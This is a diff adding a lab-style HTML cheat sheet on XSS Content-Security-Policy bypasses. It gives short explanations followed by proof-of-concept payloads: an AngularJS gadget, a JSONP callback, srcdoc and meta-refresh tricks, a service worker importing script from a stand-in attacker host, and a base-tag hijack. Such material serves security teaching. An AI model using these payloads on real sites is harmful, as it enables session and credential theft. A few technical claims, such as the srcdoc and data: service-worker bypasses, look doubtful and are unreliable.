@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS CSP Bypass</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/11-csp-bypass</span></div>
+<main class="wrap">
+    <h1>CSP Bypass</h1>
+
+    <h2>What CSP is</h2>
+    <p>Content-Security-Policy is an allow-list delivered via HTTP header or meta tag. It restricts scripts, styles, images, frames, etc.</p>
+
+    <h2>Why bypasses exist</h2>
+    <p>Weak directives (unsafe-inline, unsafe-eval), over-permissive whitelists (CDNs with JSONP), missing fallbacks, or parser quirks (data:, blob:, srcdoc).</p>
+
+    <h2>Where you’ll meet them</h2>
+    <p>whitelist gstatic.com, script-src * .googleapis.com, missing object-src, frame-src *, base-uri missing.</p>
+
+    <h2>Impact</h2>
+    <p>Full XSS resurrection even with CSP present → same cred-steal, key-log, supply-chain.</p>
+
+    <h2>Mini case-study</h2>
+    <p>2019 Slack CSP bypass via gstatic.com + AngularJS gadget → stolen session → $3 000 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- unsafe-inline missing nonce -->
+    <pre><code>// No nonce → inline allowed
+&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+    <!-- gstatic Angular -->
+    <pre><code>// Angular lib on whitelist → sandbox escape
+&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app&gt;{{constructor.constructor('alert(1)')()}}&lt;/div&gt;</code></pre>
+
+    <!-- JSONP gadget -->
+    <pre><code>// Whitelist CDN has JSONP endpoint
+&lt;script src="https://target.com/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;</code></pre>
+
+    <!-- iframe srcdoc -->
+    <pre><code>// Inherits parent CSP but allows inline
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+
+    <!-- meta refresh js -->
+    <pre><code>// Old mobile browsers still follow
+&lt;meta http-equiv="refresh" content="0;url=javascript:alert(1)"&gt;</code></pre>
+
+    <!-- Service-Worker import -->
+    <pre><code>// Worker context = no CSP
+navigator.serviceWorker.register('data:application/javascript,importScripts("//att/evil.js")')</code></pre>
+
+    <!-- base tag -->
+    <pre><code>// Relative script now attacker-hosted
+&lt;base href="https://att/"&gt;
+&lt;script src="good.js"&gt;&lt;/script&gt;</code></pre>
+
+    <h3>Further reading</h3>
+    <ul>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" style="color:var(--cyan)">OWASP CSP Cheat-Sheet</a></li>
+    </ul>
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
